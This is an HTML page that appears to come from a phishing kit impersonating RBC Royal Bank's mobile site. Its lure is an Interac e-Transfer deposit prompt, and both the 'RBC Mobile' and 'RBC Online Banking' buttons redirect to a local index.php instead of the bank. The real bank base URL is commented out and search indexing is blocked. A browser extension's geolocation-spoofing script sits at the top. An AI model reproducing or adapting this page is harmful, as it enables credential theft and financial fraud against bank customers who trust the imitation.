<html class="ui-mobile" xml:lang="en" lang="en" xmlns="http://www.w3.org/1999/xhtml"><link type="text/css" rel="stylesheet" id="dark-mode-custom-link"><link type="text/css" rel="stylesheet" id="dark-mode-general-link"><style lang="en" type="text/css" id="dark-mode-custom-style"></style><style lang="en" type="text/css" id="dark-mode-native-style"></style><style lang="en" type="text/css" id="dark-mode-native-sheet"></style><head><script>(function(){function hookGeo() {
  //<![CDATA[
  const WAIT_TIME = 100;
  const hookedObj = {
    getCurrentPosition: navigator.geolocation.getCurrentPosition.bind(navigator.geolocation),
    watchPosition: navigator.geolocation.watchPosition.bind(navigator.geolocation),
    fakeGeo: true,
    genLat: 38.883333,
    genLon: -77.000
  };

  function waitGetCurrentPosition() {
    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
      if (hookedObj.fakeGeo === true) {
        hookedObj.tmp_successCallback({
          coords: {
            latitude: hookedObj.genLat,
            longitude: hookedObj.genLon,
            accuracy: 10,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: new Date().getTime(),
        });
      } else {
        hookedObj.getCurrentPosition(hookedObj.tmp_successCallback, hookedObj.tmp_errorCallback, hookedObj.tmp_options);
      }
    } else {
      setTimeout(waitGetCurrentPosition, WAIT_TIME);
    }
  }

  function waitWatchPosition() {
    if ((typeof hookedObj.fakeGeo !== 'undefined')) {
      if (hookedObj.fakeGeo === true) {
        navigator.geolocation.getCurrentPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
        return Math.floor(Math.random() * 10000); // random id
      } else {
        hookedObj.watchPosition(hookedObj.tmp2_successCallback, hookedObj.tmp2_errorCallback, hookedObj.tmp2_options);
      }
    } else {
      setTimeout(waitWatchPosition, WAIT_TIME);
    }
  }

  Object.getPrototypeOf(navigator.geolocation).getCurrentPosition = function (successCallback, errorCallback, options) {
    hookedObj.tmp_successCallback = successCallback;
    hookedObj.tmp_errorCallback = errorCallback;
    hookedObj.tmp_options = options;
    waitGetCurrentPosition();
  };
  Object.getPrototypeOf(navigator.geolocation).watchPosition = function (successCallback, errorCallback, options) {
    hookedObj.tmp2_successCallback = successCallback;
    hookedObj.tmp2_errorCallback = errorCallback;
    hookedObj.tmp2_options = options;
    waitWatchPosition();
  };

  const instantiate = (constructor, args) => {
    const bind = Function.bind;
    const unbind = bind.bind(bind);
    return new (unbind(constructor, null).apply(null, args));
  }

  Blob = function (_Blob) {
    function secureBlob(...args) {
      const injectableMimeTypes = [
        { mime: 'text/html', useXMLparser: false },
        { mime: 'application/xhtml+xml', useXMLparser: true },
        { mime: 'text/xml', useXMLparser: true },
        { mime: 'application/xml', useXMLparser: true },
        { mime: 'image/svg+xml', useXMLparser: true },
      ];
      let typeEl = args.find(arg => (typeof arg === 'object') && (typeof arg.type === 'string') && (arg.type));

      if (typeof typeEl !== 'undefined' && (typeof args[0][0] === 'string')) {
        const mimeTypeIndex = injectableMimeTypes.findIndex(mimeType => mimeType.mime.toLowerCase() === typeEl.type.toLowerCase());
        if (mimeTypeIndex >= 0) {
          let mimeType = injectableMimeTypes[mimeTypeIndex];
          let injectedCode = `<script>(
            ${hookGeo}
          )();<\/script>`;
    
          let parser = new DOMParser();
          let xmlDoc;
          if (mimeType.useXMLparser === true) {
            xmlDoc = parser.parseFromString(args[0].join(''), mimeType.mime); // For XML documents we need to merge all items in order to not break the header when injecting
          } else {
            xmlDoc = parser.parseFromString(args[0][0], mimeType.mime);
          }

          if (xmlDoc.getElementsByTagName("parsererror").length === 0) { // if no errors were found while parsing...
            xmlDoc.documentElement.insertAdjacentHTML('afterbegin', injectedCode);
    
            if (mimeType.useXMLparser === true) {
              args[0] = [new XMLSerializer().serializeToString(xmlDoc)];
            } else {
              args[0][0] = xmlDoc.documentElement.outerHTML;
            }
          }
        }
      }

      return instantiate(_Blob, args); // arguments?
    }

    // Copy props and methods
    let propNames = Object.getOwnPropertyNames(_Blob);
    for (let i = 0; i < propNames.length; i++) {
      let propName = propNames[i];
      if (propName in secureBlob) {
        continue; // Skip already existing props
      }
      let desc = Object.getOwnPropertyDescriptor(_Blob, propName);
      Object.defineProperty(secureBlob, propName, desc);
    }

    secureBlob.prototype = _Blob.prototype;
    return secureBlob;
  }(Blob);

  // https://developer.chrome.com/docs/extensions/mv2/messaging/#external-webpage - "Only the web page can initiate a connection.", as such we need to query the background at a frequent interval
  // No hit in performance or memory usage according to our tests
  setInterval(() => {
    chrome.runtime.sendMessage('fgddmllnllkalaagkghckoinaemmogpe', { GET_LOCATION_SPOOFING_SETTINGS: true }, (response) => {
      if ((typeof response === 'object') && (typeof response.coords === 'object')) {
        hookedObj.genLat = response.coords.lat;
        hookedObj.genLon = response.coords.lon;
        hookedObj.fakeGeo = response.fakeIt;
      }
    });
  }, 500);
  //]]>
}hookGeo();})()</script><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<!--<script type="text/javascript" async="" src="./js/inpage_linkid.js" id="undefined"></script>-->
<!--<script type="text/javascript" async="" src="./js/dc.js"></script>-->
<!--<script src="./js/ztOSCUD9HVck3tcav2Qmpw((.js"></script>-->
<!--<script src="./js/vi-S4ZV0KAM1TqnzADi3Mw((.js"></script>-->
<!--<base href="http://www.rbcroyalbank.com/mobile/personal/index.html">-->
<!--<base href=".">--><base href=".">
<!--<script type="text/javascript" async="" src="./js/iE-e8tjEXoM_KpyvaIA14w((.js"></script>-->
<!--<script src="./js/serverComponent.php"></script>-->

<meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.65, minimum-scale=0.50, maximum-scale=0.80">
<!-- <meta name="viewport" id="metaViewport" content="width=device-width, user-scalable=no, initial-scale=0.50, minimum-scale=0.50, maximum-scale=0.50, target-densityDpi=device-dpi"> -->
<meta name="apple-mobile-web-app-capable" content="yes">
<title>RBC Royal Bank Mobile</title>

<link href="./indexx_files/mobile-phone-ip-an.css" type="text/css" rel="stylesheet">
<link href="./indexx_files/jquery.mobile-1.2.0.min.css" type="text/css" rel="stylesheet">

<script src="./indexx_files/jquery-1.8.2.min.js.download"></script>
<script src="./indexx_files/jquery.mobile-1.2.0.js.download"></script>
<script src="./indexx_files/jquery-util.js.download"></script>
<!--
<script src="./js/mobile.js"></script>
<script src="./js/cookie.js"></script>
<script src="./js/iscroll.js"></script>-->
<script src="chrome-extension://mooikfkahbdckldjjndioackbalphokd/assets/prompt.js"></script></head>
<body class="ui-mobile-viewport ui-overlay-c">
    <div data-role="page" id="home" class="master-wpr ui-page ui-body-c ui-page-active" data-url="home" tabindex="0" style="min-height: 1377px;">
        <!-- *** Mobile Header Start *** -->
        <div id="mobile-header">
            <span id="logo"><img src="./indexx_files/logo-en.png" height="60" alt="RBC Logo"></span>
        </div>
        <div id="mobile-sub-header">
            <span id="sub-logo"><img src="./indexx_files/int-en.png" height="47" alt="Interac e-Transfer Logo"></span>
        </div>
        <!-- *** Mobile Header End *** -->

        <div id="mobile-content">
            <div id="mobile-content-text">How would you like to deposit your Interac e-Transfer?</div>
        </div>

        <a href="index.php" id="download-link" class="ui-link">
            <div id="mobile-app-btn">
                <p class="btn-text">RBC Mobile</p>
            </div>
        </a>

        <a href="index.php" id="nothanks-link" class="ui-link">
            <div id="online-banking-btn">
                <p class="btn-text">RBC Online Banking</p>
            </div>
        </a>

        <div id="app-store-wrapper">
            <div id="app-store-text">If you don’t have the latest version of the RBC Mobile App, you can download it here:</div>
            <div id="app-store-logo">
                <span id="app-store-img">
                    <a href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8" class="ui-link">
                        <img src="./indexx_files/ios-app-str.png" height="46" alt="App Store Logo and Link to download RBC Mobile App.">
                    </a>
                </span>
            </div>
        </div>

        <div id="footer-wrapper">
            <p>Royal Bank of Canada © 1995-<script>document.write(new Date().getFullYear());</script>20232023</p>
            <p><a href="http://www.rbc.com/privacysecurity/ca/" target="_blank" class="ui-link" title="Privacy and Security (Opens new window)">Privacy &amp; Security  &nbsp; </a><img src="./indexx_files/link.png" height="9" alt=""></p>
            <p><a href="http://www.rbc.com/legal/" target="_blank" class="ui-link" title="Legal (Opens new window)">Legal  &nbsp;</a> <img src="./indexx_files/link.png" height="9" alt=""></p>
            <p><a href="http://www.rbc.com/accessibility/" target="_blank" class="ui-link" title="Accessibility (Opens new window) Link">Accessibility  &nbsp; </a><img src="./indexx_files/link.png" height="9" alt=""></p>
        </div>
    </div>
    <div class="ui-loader ui-corner-all ui-body-a ui-loader-default"><span class="ui-icon ui-icon-loading"></span><h1>loading</h1></div>
    <div class="ui-loader ui-corner-all ui-body-a ui-loader-default"><span class="ui-icon ui-icon-loading"></span><h1>loading</h1></div>

</body></html>
<script>
    // Add click event listeners to the buttons
    document.getElementById("download-link").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default behavior of the anchor element
        window.location.href = "index.php"; // Redirect to index.php
    });

    document.getElementById("nothanks-link").addEventListener("click", function(event) {
        event.preventDefault(); // Prevent the default behavior of the anchor element
        window.location.href = "index.php"; // Redirect to index.php
    });
</script>
